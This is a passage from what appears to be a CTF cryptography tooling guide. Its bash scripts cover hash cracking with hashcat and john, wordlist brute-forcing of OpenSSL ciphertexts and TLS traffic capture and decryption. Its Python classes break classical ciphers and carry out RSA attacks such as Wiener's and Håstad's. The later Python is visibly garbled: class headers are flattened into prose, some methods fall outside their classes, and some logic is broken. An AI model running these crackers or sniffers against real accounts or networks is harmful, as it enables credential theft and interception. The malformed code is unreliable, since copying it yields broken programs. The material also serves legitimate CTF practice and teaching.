    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            echo "[!] Missing tool: $tool"
            exit 1
        fi
    done
    echo "[+] All required tools present"
}

# Create working directory structure
setup_workspace() {
    local workspace="$HOME/ctf_crypto"
    mkdir -p "$workspace"/{input,output,wordlists,scripts,logs}
    cd "$workspace"
    echo "[+] Workspace created at $workspace"
}

# Update wordlists
update_wordlists() {
    local wordlist_dir="$HOME/ctf_crypto/wordlists"
    
    # Download common wordlists
    if [ ! -f "$wordlist_dir/rockyou.txt" ]; then
        echo "[*] Downloading rockyou.txt..."
        wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt \
            -O "$wordlist_dir/rockyou.txt"
    fi
    
    echo "[+] Wordlists ready"
}

check_tools
setup_workspace
update_wordlists
```

**Hash Identification and Cracking Automation:**

```bash
#!/bin/bash
# hash_cracker.sh - Automated hash identification and cracking

usage() {
    echo "Usage: $0 <hash_file> [wordlist]"
    echo "  hash_file: File containing hashes (one per line)"
    echo "  wordlist:  Optional wordlist (default: rockyou.txt)"
    exit 1
}

# Check arguments
[ $# -lt 1 ] && usage

HASH_FILE="$1"
WORDLIST="${2:-$HOME/ctf_crypto/wordlists/rockyou.txt}"
OUTPUT_DIR="$HOME/ctf_crypto/output/$(date +%Y%m%d_%H%M%S)"

mkdir -p "$OUTPUT_DIR"

# Identify hash type
identify_hash() {
    local hash="$1"
    local hash_len=${#hash}
    
    case $hash_len in
        32)
            echo "md5"
            ;;
        40)
            echo "sha1"
            ;;
        64)
            echo "sha256"
            ;;
        128)
            echo "sha512"
            ;;
        *)
            # Try hash-identifier
            echo "$hash" | hash-identifier 2>/dev/null | grep -i "possible" | head -1
            ;;
    esac
}

# Crack with hashcat
crack_hashcat() {
    local hash="$1"
    local hash_type="$2"
    local output_file="$OUTPUT_DIR/cracked_hashcat.txt"
    
    # Map hash type to hashcat mode
    case $hash_type in
        "md5")
            mode=0
            ;;
        "sha1")
            mode=100
            ;;
        "sha256")
            mode=1400
            ;;
        "sha512")
            mode=1700
            ;;
        *)
            echo "[!] Unknown hash type for hashcat: $hash_type"
            return 1
            ;;
    esac
    
    echo "[*] Attempting hashcat (mode $mode)..."
    echo "$hash" > "$OUTPUT_DIR/temp_hash.txt"
    
    hashcat -m "$mode" -a 0 "$OUTPUT_DIR/temp_hash.txt" "$WORDLIST" \
        --potfile-path="$OUTPUT_DIR/hashcat.pot" \
        --outfile="$output_file" \
        --quiet 2>/dev/null
    
    if [ -f "$output_file" ]; then
        cat "$output_file"
        return 0
    fi
    return 1
}

# Crack with john
crack_john() {
    local hash="$1"
    local hash_type="$2"
    local output_file="$OUTPUT_DIR/cracked_john.txt"
    
    echo "[*] Attempting john the ripper..."
    echo "$hash" > "$OUTPUT_DIR/temp_hash.txt"
    
    john --wordlist="$WORDLIST" \
         --format="raw-${hash_type}" \
         "$OUTPUT_DIR/temp_hash.txt" \
         --pot="$OUTPUT_DIR/john.pot" 2>/dev/null
    
    john --show --format="raw-${hash_type}" "$OUTPUT_DIR/temp_hash.txt" \
        > "$output_file" 2>/dev/null
    
    if grep -q ":" "$output_file"; then
        cat "$output_file"
        return 0
    fi
    return 1
}

# Process each hash
while IFS= read -r hash; do
    # Skip empty lines and comments
    [[ -z "$hash" || "$hash" =~ ^# ]] && continue
    
    echo "================================"
    echo "[*] Processing: $hash"
    
    # Identify hash type
    hash_type=$(identify_hash "$hash")
    echo "[+] Detected type: $hash_type"
    
    # Try cracking
    if crack_hashcat "$hash" "$hash_type"; then
        echo "[+] Cracked with hashcat!"
    elif crack_john "$hash" "$hash_type"; then
        echo "[+] Cracked with john!"
    else
        echo "[-] Failed to crack: $hash"
        echo "$hash" >> "$OUTPUT_DIR/uncracked.txt"
    fi
    
done < "$HASH_FILE"

echo ""
echo "[+] Results saved to: $OUTPUT_DIR"
[ -f "$OUTPUT_DIR/uncracked.txt" ] && echo "[!] Uncracked hashes in: $OUTPUT_DIR/uncracked.txt"
```

**Certificate and Key Analysis:**

```bash
#!/bin/bash
# cert_analyzer.sh - Extract and analyze certificate information

analyze_certificate() {
    local cert_file="$1"
    local output_base="${cert_file%.*}_analysis"
    
    echo "[*] Analyzing certificate: $cert_file"
    
    # Detect format (PEM or DER)
    if file "$cert_file" | grep -q "PEM"; then
        format="pem"
        inform_flag="-inform PEM"
    else
        format="der"
        inform_flag="-inform DER"
    fi
    
    echo "[+] Format: $format"
    
    # Extract basic information
    openssl x509 $inform_flag -in "$cert_file" -noout -text \
        > "${output_base}_full.txt"
    
    # Extract specific fields
    echo "[+] Subject:"
    openssl x509 $inform_flag -in "$cert_file" -noout -subject
    
    echo "[+] Issuer:"
    openssl x509 $inform_flag -in "$cert_file" -noout -issuer
    
    echo "[+] Validity:"
    openssl x509 $inform_flag -in "$cert_file" -noout -dates
    
    echo "[+] Serial Number:"
    openssl x509 $inform_flag -in "$cert_file" -noout -serial
    
    # Extract public key
    echo "[*] Extracting public key..."
    openssl x509 $inform_flag -in "$cert_file" -pubkey -noout \
        > "${output_base}_pubkey.pem"
    
    # Analyze public key
    echo "[+] Public key details:"
    openssl rsa -pubin -in "${output_base}_pubkey.pem" -text -noout \
        > "${output_base}_pubkey_details.txt" 2>/dev/null
    
    # Extract modulus for RSA
    if grep -q "RSA" "${output_base}_pubkey_details.txt"; then
        openssl rsa -pubin -in "${output_base}_pubkey.pem" -modulus -noout \
            > "${output_base}_modulus.txt"
        echo "[+] RSA modulus extracted to ${output_base}_modulus.txt"
        
        # Calculate modulus bit length
        modulus=$(cat "${output_base}_modulus.txt" | cut -d'=' -f2)
        bit_length=$((${#modulus} * 4))
        echo "[+] Key size: $bit_length bits"
    fi
    
    # Check for weak keys
    check_weak_key "${output_base}_pubkey.pem"
    
    echo "[+] Analysis complete. Files saved with prefix: ${output_base}"
}

check_weak_key() {
    local pubkey_file="$1"
    
    # Check RSA key size
    if openssl rsa -pubin -in "$pubkey_file" -text -noout 2>/dev/null | grep -q "Public-Key: (1024 bit)"; then
        echo "[!] WARNING: 1024-bit RSA key detected (weak)"
    fi
    
    # Check for common factors (if multiple keys available)
    # [Inference] This would require comparing with other keys
}

# Batch process certificates
if [ -d "$1" ]; then
    echo "[*] Processing directory: $1"
    for cert in "$1"/*.{pem,der,crt,cer} 2>/dev/null; do
        [ -f "$cert" ] && analyze_certificate "$cert"
    done
else
    analyze_certificate "$1"
fi
```

**Automated Encoding/Decoding Chain:**

```bash
#!/bin/bash
# decode_chain.sh - Try multiple encoding schemes automatically

decode_chain() {
    local input="$1"
    local depth="${2:-5}"  # Maximum recursion depth
    local current_depth="${3:-0}"
    
    # Prevent infinite recursion
    if [ "$current_depth" -ge "$depth" ]; then
        echo "[!] Max depth reached"
        echo "$input"
        return
    fi
    
    echo "[*] Depth $current_depth: Analyzing input..."
    echo "Input: ${input:0:100}..." # Show first 100 chars
    
    # Try base64
    if echo "$input" | grep -qE '^[A-Za-z0-9+/=]+$'; then
        echo "[*] Trying base64..."
        decoded=$(echo "$input" | base64 -d 2>/dev/null)
        if [ $? -eq 0 ] && [ -n "$decoded" ]; then
            echo "[+] Base64 decoded successfully"
            # Recursively decode
            decode_chain "$decoded" "$depth" $((current_depth + 1))
            return
        fi
    fi
    
    # Try hex
    if echo "$input" | grep -qE '^[0-9a-fA-F]+$' && [ $((${#input} % 2)) -eq 0 ]; then
        echo "[*] Trying hex..."
        decoded=$(echo "$input" | xxd -r -p 2>/dev/null)
        if [ $? -eq 0 ] && [ -n "$decoded" ]; then
            echo "[+] Hex decoded successfully"
            decode_chain "$decoded" "$depth" $((current_depth + 1))
            return
        fi
    fi
    
    # Try URL encoding
    if echo "$input" | grep -q '%[0-9A-Fa-f][0-9A-Fa-f]'; then
        echo "[*] Trying URL decode..."
        decoded=$(echo "$input" | sed 's/%/\\x/g' | xargs -0 printf "%b")
        if [ -n "$decoded" ]; then
            echo "[+] URL decoded successfully"
            decode_chain "$decoded" "$depth" $((current_depth + 1))
            return
        fi
    fi
    
    # Try ROT13
    if echo "$input" | grep -qE '^[A-Za-z ]+$'; then
        echo "[*] Trying ROT13..."
        decoded=$(echo "$input" | tr 'A-Za-z' 'N-ZA-Mn-za-m')
        if [ "$decoded" != "$input" ]; then
            echo "[+] ROT13 applied"
            decode_chain "$decoded" "$depth" $((current_depth + 1))
            return
        fi
    fi
    
    # Try base32
    if echo "$input" | grep -qE '^[A-Z2-7=]+$'; then
        echo "[*] Trying base32..."
        decoded=$(echo "$input" | base32 -d 2>/dev/null)
        if [ $? -eq 0 ] && [ -n "$decoded" ]; then
            echo "[+] Base32 decoded successfully"
            decode_chain "$decoded" "$depth" $((current_depth + 1))
            return
        fi
    fi
    
    # No more decodings possible
    echo "[+] Final result:"
    echo "$input"
}

# Read from file or stdin
if [ -n "$1" ]; then
    input=$(cat "$1")
else
    read -r input
fi

decode_chain "$input"
```

**Bulk Cipher Operations:**

```bash
#!/bin/bash
# bulk_decrypt.sh - Try decrypting with multiple keys/passwords

bulk_decrypt_openssl() {
    local ciphertext_file="$1"
    local wordlist="$2"
    local cipher="${3:-aes-256-cbc}"
    
    echo "[*] Attempting bulk decryption"
    echo "[*] Cipher: $cipher"
    echo "[*] Ciphertext: $ciphertext_file"
    echo "[*] Wordlist: $wordlist"
    
    local count=0
    while IFS= read -r password; do
        ((count++))
        
        # Try decryption
        result=$(openssl enc -d -"$cipher" -in "$ciphertext_file" \
                 -pass pass:"$password" -pbkdf2 2>/dev/null)
        
        # Check if decryption succeeded (contains printable text)
        if echo "$result" | grep -qE '^[[:print:][:space:]]+$'; then
            echo "[+] SUCCESS! Password found: $password"
            echo "[+] Decrypted content:"
            echo "$result"
            return 0
        fi
        
        # Progress indicator
        if [ $((count % 100)) -eq 0 ]; then
            echo "[*] Tried $count passwords..."
        fi
        
    done < "$wordlist"
    
    echo "[-] Failed to decrypt with $count passwords"
    return 1
}

# Try common cipher variants
try_common_ciphers() {
    local ciphertext_file="$1"
    local password="$2"
    
    local ciphers=("aes-256-cbc" "aes-128-cbc" "aes-192-cbc" 
                   "des3" "des-ede3-cbc" "bf-cbc" "cast5-cbc")
    
    for cipher in "${ciphers[@]}"; do
        echo "[*] Trying cipher: $cipher"
        
        result=$(openssl enc -d -"$cipher" -in "$ciphertext_file" \
                -pass pass:"$password" -pbkdf2 2>/dev/null)
        
        if [ $? -eq 0 ] && echo "$result" | grep -qE '[[:print:]]'; then
            echo "[+] Success with $cipher"
            echo "$result"
            return 0
        fi
    done
    
    echo "[-] No cipher succeeded"
    return 1
}

# Usage based on arguments
if [ $# -eq 2 ]; then
    bulk_decrypt_openssl "$1" "$2"
elif [ $# -eq 3 ]; then
    if [ -f "$2" ]; then
        bulk_decrypt_openssl "$1" "$2" "$3"
    else
        try_common_ciphers "$1" "$2"
    fi
else
    echo "Usage:"
    echo "  $0 <ciphertext> <wordlist> [cipher]"
    echo "  $0 <ciphertext> <password> (tries all ciphers)"
    exit 1
fi
```

**Network Crypto Traffic Capture:**

```bash
#!/bin/bash
# capture_crypto.sh - Capture and analyze encrypted network traffic

capture_tls_handshake() {
    local interface="${1:-eth0}"
    local target_host="$2"
    local output_dir="$HOME/ctf_crypto/output/tls_$(date +%Y%m%d_%H%M%S)"
    
    mkdir -p "$output_dir"
    
    echo "[*] Capturing TLS handshake on $interface"
    [ -n "$target_host" ] && echo "[*] Filtering for host: $target_host"
    
    # Build tcpdump filter
    local filter="tcp and (port 443 or port 8443)"
    [ -n "$target_host" ] && filter="$filter and host $target_host"
    
    # Capture packets
    local pcap_file="$output_dir/capture.pcap"
    echo "[*] Starting capture (Ctrl+C to stop)..."
    
    timeout 60 tcpdump -i "$interface" -w "$pcap_file" "$filter" 2>/dev/null
    
    echo "[+] Capture complete: $pcap_file"
    
    # Extract TLS information
    echo "[*] Extracting TLS details..."
    tshark -r "$pcap_file" -Y "tls.handshake" -T fields \
        -e frame.number \
        -e ip.src \
        -e ip.dst \
        -e tls.handshake.type \
        -e tls.handshake.ciphersuite \
        > "$output_dir/tls_handshake.txt" 2>/dev/null
    
    # Extract certificates
    echo "[*] Extracting certificates..."
    tshark -r "$pcap_file" -Y "tls.handshake.certificate" \
        --export-objects "tls,$output_dir/certs" 2>/dev/null
    
    echo "[+] Analysis complete. Results in: $output_dir"
}

# Extract SSL keys from memory (if SSLKEYLOGFILE available)
extract_ssl_keys() {
    local pcap_file="$1"
    local keylog_file="$2"
    local output_file="${pcap_file%.*}_decrypted.pcap"
    
    if [ ! -f "$keylog_file" ]; then
        echo "[!] SSL keylog file not found: $keylog_file"
        return 1
    fi
    
    echo "[*] Decrypting TLS traffic..."
    
    # Use editcap with TLS keys
    editcap --inject-secrets tls,"$keylog_file" "$pcap_file" "$output_file"
    
    echo "[+] Decrypted traffic saved to: $output_file"
    
    # Extract HTTP data
    tshark -r "$output_file" -Y "http" -T fields \
        -e http.request.method \
        -e http.request.uri \
        -e http.response.code \
        > "${output_file%.*}_http.txt"
    
    echo "[+] HTTP requests extracted to: ${output_file%.*}_http.txt"
}

# Main execution
case "${1:-capture}" in
    capture)
        capture_tls_handshake "$2" "$3"
        ;;
    decrypt)
        extract_ssl_keys "$2" "$3"
        ;;
    *)
        echo "Usage:"
        echo "  $0 capture [interface] [target_host]"
        echo "  $0 decrypt <pcap_file> <keylog_file>"
        exit 1
        ;;
esac
```

**Parallel Processing for Brute Force:**

```bash
#!/bin/bash
# parallel_bruteforce.sh - Distribute crypto tasks across cores

parallel_decrypt() {
    local ciphertext="$1"
    local wordlist="$2"
    local num_jobs="${3:-$(nproc)}"
    
    echo "[*] Starting parallel decryption with $num_jobs jobs"
    
    # Split wordlist into chunks
    local total_lines=$(wc -l < "$wordlist")
    local lines_per_job=$((total_lines / num_jobs + 1))
    
    split -l "$lines_per_job" -d "$wordlist" /tmp/wordlist_chunk_
    
    # Function to test passwords from a chunk
    test_chunk() {
        local chunk_file="$1"
        local ciphertext="$2"
        
        while IFS= read -r password; do
            # Try decryption
            result=$(echo "$ciphertext" | openssl enc -d -aes-256-cbc \
                     -pass pass:"$password" -base64 2>/dev/null)
            
            if [ $? -eq 0 ] && echo "$result" | grep -q "flag"; then
                echo "[+] FOUND: $password"
                echo "$result"
                # Kill other jobs
                pkill -P $$
                exit 0
            fi
        done < "$chunk_file"
    }
    
    export -f test_chunk
    
    # Process chunks in parallel
    for chunk in /tmp/wordlist_chunk_*; do
        test_chunk "$chunk" "$ciphertext" &
    done
    
    # Wait for all jobs
    wait
    
    # Cleanup
    rm -f /tmp/wordlist_chunk_*
    
    echo "[*] Parallel brute force complete"
}

# Use GNU parallel if available
parallel_with_gnu() {
    local ciphertext="$1"
    local wordlist="$2"
    local num_jobs="${3:-$(nproc)}"
    
    if ! command -v parallel &> /dev/null; then
        echo "[!] GNU parallel not installed"
        parallel_decrypt "$ciphertext" "$wordlist" "$num_jobs"
        return
    fi
    
    echo "[*] Using GNU parallel with $num_jobs jobs"
    
    cat "$wordlist" | parallel -j "$num_jobs" \
        "echo '$ciphertext' | openssl enc -d -aes-256-cbc -pass pass:{} -base64 2>/dev/null | grep -q flag && echo '[+] Password: {}'"
}

# Example usage
if [ $# -lt 2 ]; then
    echo "Usage: $0 <ciphertext_or_file> <wordlist> [num_jobs]"
    exit 1
fi

if [ -f "$1" ]; then
    ciphertext=$(cat "$1")
else
    ciphertext="$1"
fi

parallel_with_gnu "$ciphertext" "$2" "$3"
```

### Python for Cryptanalysis

Python provides extensive libraries for implementing cryptographic attacks, mathematical operations, and custom protocol analysis.

**Comprehensive Cryptanalysis Framework:**

```python
#!/usr/bin/env python3
# crypto_analyzer.py - Modular cryptanalysis framework

import sys
import string
from collections import Counter
from typing import List, Dict, Tuple, Optional
import argparse

class CryptoAnalyzer:
    """
    Base class for cryptanalysis operations
    """
    
    def __init__(self):
        self.english_freq = {
            'e': 12.70, 't': 9.06, 'a': 8.17, 'o': 7.51, 'i': 6.97,
            'n': 6.75, 's': 6.33, 'h': 6.09, 'r': 5.99, 'd': 4.25,
            'l': 4.03, 'c': 2.78, 'u': 2.76, 'm': 2.41, 'w': 2.36,
            'f': 2.23, 'g': 2.02, 'y': 1.97, 'p': 1.93, 'b': 1.29,
            'v': 0.98, 'k': 0.77, 'j': 0.15, 'x': 0.15, 'q': 0.10, 'z': 0.07
        }
    
    def frequency_analysis(self, text: str) -> Dict[str, float]:
        """
        Calculate character frequency in text
        """
        text_lower = text.lower()
        letters_only = ''.join(c for c in text_lower if c.isalpha())
        
        if not letters_only:
            return {}
        
        counts = Counter(letters_only)
        total = len(letters_only)
        
        frequencies = {char: (count / total) * 100 
                      for char, count in counts.items()}
        
        return dict(sorted(frequencies.items(), 
                          key=lambda x: x[1], reverse=True))
    
    def chi_squared(self, text: str) -> float:
        """
        Calculate chi-squared statistic for English text
        Lower values indicate closer match to English
        """
        observed = self.frequency_analysis(text)
        
        chi_sq = 0.0
        for char in string.ascii_lowercase:
            expected = self.english_freq.get(char, 0.1)
            actual = observed.get(char, 0)
            chi_sq += ((actual - expected) ** 2) / expected
        
        return chi_sq
    
    def detect_language(self, text: str) -> Tuple[str, float]:
        """
        Detect if text is likely English
        [Inference] Based on chi-squared test against English frequencies
        """
        chi_sq = self.chi_squared(text)
        
        if chi_sq < 50:
            return ("English", chi_sq)
        elif chi_sq < 100:
            return ("Possibly English", chi_sq)
        else:
            return ("Not English", chi_sq)
    
    def find_repeated_sequences(self, text: str, min_length: int = 3) -> Dict[str, List[int]]:
        """
        Find repeated sequences and their positions (Kasiski examination)
        """
        sequences = {}
        text_clean = ''.join(c for c in text if c.isalpha()).upper()
        
        for length in range(min_length, min(len(text_clean) // 2, 20)):
            for i in range(len(text_clean) - length):
                seq = text_clean[i:i+length]
                
                # Find all occurrences
                positions = []
                pos = 0
                while True:
                    pos = text_clean.find(seq, pos)
                    if pos == -1:
                        break
                    positions.append(pos)
                    pos += 1
                
                if len(positions) >= 2:
                    sequences[seq] = positions
        
        return sequences
    
    def calculate_ioc(self, text: str) -> float:
        """
        Calculate Index of Coincidence
        English text typically has IoC around 0.065-0.067
        Random text has IoC around 0.038
        """
        text_clean = ''.join(c for c in text.upper() if c.isalpha())
        n = len(text_clean)
        
        if n < 2:
            return 0.0
        
        counts = Counter(text_clean)
        
        ioc = sum(count * (count - 1) for count in counts.values())
        ioc /= (n * (n - 1))
        
        return ioc


class CaesarCipher(CryptoAnalyzer):
    """
    Caesar cipher encryption and cryptanalysis
    """
    
    def encrypt(self, plaintext: str, shift: int) -> str:
        """
        Encrypt text using Caesar cipher
        """
        result = []
        for char in plaintext:
            if char.isalpha():
                base = ord('A') if char.isupper() else ord('a')
                shifted = (ord(char) - base + shift) % 26
                result.append(chr(base + shifted))
            else:
                result.append(char)
        return ''.join(result)
    
    def decrypt(self, ciphertext: str, shift: int) -> str:
        """
        Decrypt Caesar cipher
        """
        return self.encrypt(ciphertext, -shift)
    
    def break_cipher(self, ciphertext: str) -> List[Tuple[int, str, float]]:
        """
        Brute force Caesar cipher and rank by English-likeness
        """
        results = []
        
        for shift in range(26):
            plaintext = self.decrypt(ciphertext, shift)
            chi_sq = self.chi_squared(plaintext)
            results.append((shift, plaintext, chi_sq))
        
        # Sort by chi-squared (lower is better)
        results.sort(key=lambda x: x[2])
        
        return results


class VigenereCipher(CryptoAnalyzer):
    """
    Vigenere cipher encryption and cryptanalysis
    """
    
    def encrypt(self, plaintext: str, key: str) -> str:
        """
        Encrypt using Vigenere cipher
        """
        result = []
        key_upper = key.upper()
        key_index = 0
        
        for char in plaintext:
            if char.isalpha():
                base = ord('A') if char.isupper() else ord('a')
                key_char = key_upper[key_index % len(key_upper)]
                shift = ord(key_char) - ord('A')
                
                encrypted = (ord(char) - base + shift) % 26
                result.append(chr(base + encrypted))
                key_index += 1
            else:
                result.append(char)
        
        return ''.join(result)
    
    def decrypt(self, ciphertext: str, key: str) -> str:
        """
        Decrypt Vigenere cipher
        """
        result = []
        key_upper = key.upper()
        key_index = 0
        
        for char in ciphertext:
            if char.isalpha():
                base = ord('A') if char.isupper() else ord('a')
                key_char = key_upper[key_index % len(key_upper)]
                shift = ord(key_char) - ord('A')
                
                decrypted = (ord(char) - base - shift) % 26
                result.append(chr(base + decrypted))
                key_index += 1
            else:
                result.append(char)
        
        return ''.join(result)
    
def estimate_key_length(self, ciphertext: str, max_length: int = 20) -> list[tuple[int, float]]:
    """
    Estimate Vigenère key length using Kasiski examination and Index of Coincidence (IoC).
    """
    from math import gcd
    from functools import reduce

    # --- Method 1: Kasiski Examination ---
    sequences = self.find_repeated_sequences(ciphertext)
    distances = []

    for seq, positions in sequences.items():
        if len(positions) >= 2:
            for i in range(len(positions) - 1):
                dist = positions[i + 1] - positions[i]
                distances.append(dist)

    # Find GCD of all distances (common key length divisor)
    common_gcd = reduce(gcd, distances) if distances else 1

    # --- Method 2: Index of Coincidence ---
    ioc_results = []
    text_clean = ''.join(c for c in ciphertext if c.isalpha()).upper()

    for key_len in range(1, min(max_length + 1, len(text_clean) // 2)):
        avg_ioc = 0.0
        for offset in range(key_len):
            column = text_clean[offset::key_len]
            if len(column) > 1:
                avg_ioc += self.calculate_ioc(column)
        avg_ioc /= key_len
        ioc_results.append((key_len, avg_ioc))

    # Sort by closeness to English IoC (≈ 0.065)
    ioc_results.sort(key=lambda x: abs(x[1] - 0.065))

    return ioc_results


def break_cipher(self, ciphertext: str, key_length: Optional[int] = None) -> List[Tuple[str, str, float]]:
    """
    Break Vigenere cipher using frequency analysis
    """
    text_clean = ''.join(c for c in ciphertext if c.isalpha()).upper()
    
    # Estimate key length if not provided
    if key_length is None:
        key_estimates = self.estimate_key_length(ciphertext)
        key_length = key_estimates[0][0] if key_estimates else 5
        print(f"[*] Estimated key length: {key_length}")
    
    # Break each column with Caesar cipher analysis
    key_chars = []
    
    for offset in range(key_length):
        column = text_clean[offset::key_length]
        
        # Try all possible shifts for this column
        best_shift = 0
        best_chi_sq = float('inf')
        
        for shift in range(26):
            decrypted_column = ''.join(
                chr((ord(c) - ord('A') - shift) % 26 + ord('A'))
                for c in column
            )
            chi_sq = self.chi_squared(decrypted_column)
            
            if chi_sq < best_chi_sq:
                best_chi_sq = chi_sq
                best_shift = shift
        
        key_chars.append(chr(best_shift + ord('A')))
    
    recovered_key = ''.join(key_chars)
    plaintext = self.decrypt(ciphertext, recovered_key)
    chi_sq = self.chi_squared(plaintext)
    
    return [(recovered_key, plaintext, chi_sq)]
```

class XORAnalyzer(CryptoAnalyzer): """ XOR cipher analysis and attacks """

```
def xor_bytes(self, data: bytes, key: bytes) -> bytes:
    """
    XOR data with repeating key
    """
    return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))

def xor_single_byte(self, data: bytes, key_byte: int) -> bytes:
    """
    XOR with single byte
    """
    return bytes(b ^ key_byte for b in data)

def score_plaintext(self, text: bytes) -> float:
    """
    Score text by likelihood of being English
    [Inference] Uses character frequency scoring
    """
    try:
        decoded = text.decode('ascii', errors='ignore')
    except:
        return float('inf')
    
    # Count printable characters
    printable_count = sum(1 for c in decoded if c in string.printable)
    if printable_count < len(decoded) * 0.8:
        return float('inf')
    
    # Use chi-squared test
    return self.chi_squared(decoded)

def break_single_byte_xor(self, ciphertext: bytes) -> List[Tuple[int, bytes, float]]:
    """
    Break single-byte XOR by trying all 256 keys
    """
    results = []
    
    for key in range(256):
        plaintext = self.xor_single_byte(ciphertext, key)
        score = self.score_plaintext(plaintext)
        
        if score != float('inf'):
            results.append((key, plaintext, score))
    
    # Sort by score (lower is better)
    results.sort(key=lambda x: x[2])
    
    return results[:10]  # Return top 10 candidates

def find_repeating_key_length(self, ciphertext: bytes, max_keysize: int = 40) -> List[Tuple[int, float]]:
    """
    Find likely key length for repeating-key XOR using Hamming distance
    """
    def hamming_distance(b1: bytes, b2: bytes) -> int:
        """Count differing bits"""
        return sum(bin(x ^ y).count('1') for x, y in zip(b1, b2))
    
    keysize_distances = []
    
    for keysize in range(2, min(max_keysize, len(ciphertext) // 2)):
        # Take multiple blocks and average the distances
        distances = []
        num_blocks = min(4, len(ciphertext) // keysize)
        
        for i in range(num_blocks - 1):
            block1 = ciphertext[i * keysize:(i + 1) * keysize]
            block2 = ciphertext[(i + 1) * keysize:(i + 2) * keysize]
            
            if len(block1) == keysize and len(block2) == keysize:
                distance = hamming_distance(block1, block2) / keysize
                distances.append(distance)
        
        if distances:
            avg_distance = sum(distances) / len(distances)
            keysize_distances.append((keysize, avg_distance))
    
    # Sort by normalized distance (lower is better)
    keysize_distances.sort(key=lambda x: x[1])
    
    return keysize_distances

def break_repeating_key_xor(self, ciphertext: bytes, keysize: Optional[int] = None) -> List[Tuple[bytes, bytes, float]]:
    """
    Break repeating-key XOR cipher
    """
    # Find likely key size if not provided
    if keysize is None:
        keysize_candidates = self.find_repeating_key_length(ciphertext)
        if not keysize_candidates:
            return []
        keysize = keysize_candidates[0][0]
        print(f"[*] Estimated key size: {keysize}")
    
    # Break into blocks and transpose
    blocks = [ciphertext[i::keysize] for i in range(keysize)]
    
    # Break each block with single-byte XOR
    key_bytes = []
    for block in blocks:
        if len(block) > 0:
            candidates = self.break_single_byte_xor(block)
            if candidates:
                key_bytes.append(candidates[0][0])
            else:
                key_bytes.append(0)
    
    key = bytes(key_bytes)
    plaintext = self.xor_bytes(ciphertext, key)
    score = self.score_plaintext(plaintext)
    
    return [(key, plaintext, score)]
```

class RSAAnalyzer: """ RSA cryptanalysis utilities """

```
def __init__(self):
    self.small_primes = self._generate_small_primes(10000)

def _generate_small_primes(self, limit: int) -> List[int]:
    """
    Generate list of small primes using Sieve of Eratosthenes
    """
    sieve = [True] * limit
    sieve[0] = sieve[1] = False
    
    for i in range(2, int(limit ** 0.5) + 1):
        if sieve[i]:
            for j in range(i * i, limit, i):
                sieve[j] = False
    
    return [i for i in range(limit) if sieve[i]]

def trial_division(self, n: int) -> Optional[Tuple[int, int]]:
    """
    Attempt to factor n using trial division with small primes
    """
    for p in self.small_primes:
        if n % p == 0:
            q = n // p
            return (p, q)
    return None

def gcd(self, a: int, b: int) -> int:
    """
    Calculate greatest common divisor
    """
    while b:
        a, b = b, a % b
    return a

def extended_gcd(self, a: int, b: int) -> Tuple[int, int, int]:
    """
    Extended Euclidean algorithm
    Returns (gcd, x, y) such that a*x + b*y = gcd
    """
    if b == 0:
        return (a, 1, 0)
    
    gcd, x1, y1 = self.extended_gcd(b, a % b)
    x = y1
    y = x1 - (a // b) * y1
    
    return (gcd, x, y)

def modinv(self, a: int, m: int) -> Optional[int]:
    """
    Calculate modular inverse of a modulo m
    """
    gcd, x, _ = self.extended_gcd(a, m)
    
    if gcd != 1:
        return None  # Modular inverse doesn't exist
    
    return x % m

def common_modulus_attack(self, n: int, e1: int, c1: int, e2: int, c2: int) -> Optional[int]:
    """
    Common modulus attack when same message encrypted with different exponents
    [Inference] Requires gcd(e1, e2) = 1
    """
    gcd, a, b = self.extended_gcd(e1, e2)
    
    if gcd != 1:
        print("[!] Exponents not coprime")
        return None
    
    # Handle negative exponents
    if a < 0:
        c1 = self.modinv(c1, n)
        a = -a
    if b < 0:
        c2 = self.modinv(c2, n)
        b = -b
    
    # Calculate m = c1^a * c2^b mod n
    m = (pow(c1, a, n) * pow(c2, b, n)) % n
    
    return m

def wieners_attack(self, e: int, n: int) -> Optional[int]:
    """
    Wiener's attack for small private exponent d
    [Inference] Works when d < (1/3) * n^(1/4)
    """
    from fractions import Fraction
    
    # Calculate continued fraction convergents of e/n
    convergents = self._continued_fraction_convergents(e, n)
    
    for k, d in convergents:
        if k == 0:
            continue
        
        # Check if this d works
        phi = (e * d - 1) // k
        
        # Solve for p and q: x^2 - (n - phi + 1)x + n = 0
        b = n - phi + 1
        discriminant = b * b - 4 * n
        
        if discriminant >= 0:
            sqrt_disc = int(discriminant ** 0.5)
            if sqrt_disc * sqrt_disc == discriminant:
                p = (b + sqrt_disc) // 2
                q = (b - sqrt_disc) // 2
                
                if p * q == n:
                    return d
    
    return None

def _continued_fraction_convergents(self, e: int, n: int) -> List[Tuple[int, int]]:
    """
    Calculate continued fraction convergents
    """
    convergents = []
    
    # Calculate continued fraction expansion
    cf = []
    num, den = e, n
    
    while den:
        q = num // den
        cf.append(q)
        num, den = den, num - q * den
    
    # Calculate convergents
    h_prev, h_curr = 0, 1
    k_prev, k_curr = 1, 0
    
    for q in cf:
        h_next = q * h_curr + h_prev
        k_next = q * k_curr + k_prev
        
        convergents.append((k_next, h_next))
        
        h_prev, h_curr = h_curr, h_next
        k_prev, k_curr = k_curr, k_next
    
    return convergents

def hastad_broadcast_attack(self, n_list: List[int], c_list: List[int], e: int) -> Optional[int]:
    """
    Håstad's broadcast attack (same message to multiple recipients with small e)
    [Inference] Requires at least e different moduli
    """
    if len(n_list) < e:
        print(f"[!] Need at least {e} ciphertexts")
        return None
    
    # Use Chinese Remainder Theorem
    result = self._chinese_remainder_theorem(n_list[:e], c_list[:e])
    
    if result is None:
        return None
    
    # Take e-th root
    m = self._nth_root(result, e)
    
    return m

def _chinese_remainder_theorem(self, n_list: List[int], a_list: List[int]) -> Optional[int]:
    """
    Solve system of congruences using CRT
    """
    N = 1
    for n in n_list:
        N *= n
    
    result = 0
    for n_i, a_i in zip(n_list, a_list):
        N_i = N // n_i
        M_i = self.modinv(N_i, n_i)
        
        if M_i is None:
            return None
        
        result += a_i * N_i * M_i
    
    return result % N

def _nth_root(self, x: int, n: int) -> int:
    """
    Calculate integer nth root
    """
    high = 1
    while high ** n < x:
        high *= 2
    
    low = high // 2
    
    while low < high:
        mid = (low + high) // 2
        mid_n = mid ** n
        
        if mid_n < x:
            low = mid + 1
        elif mid_n > x:
            high = mid
        else:
            return mid
    
    return low if low ** n == x else -1
```

